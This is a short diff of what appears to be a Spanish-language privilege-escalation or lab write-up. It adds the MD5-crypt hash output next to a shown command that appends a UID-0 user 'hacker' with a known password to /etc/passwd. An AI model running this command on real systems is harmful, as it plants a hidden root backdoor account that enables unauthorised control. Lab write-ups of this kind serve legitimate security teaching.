@@ -61,6 +61,7 @@ Ahora como no puedo editar el archivo voy a añadir directamente un usuario nuev
 
 ```bash
 openssl passwd password
+$1$OM6nPqQf$9TzDN//UqkfWpAZY7lZhL1
 echo 'hacker:$1$OM6nPqQf$9TzDN//UqkfWpAZY7lZhL1:0:0::/home/hacker:/bin/bash' >> /etc/passwd
 ```
 
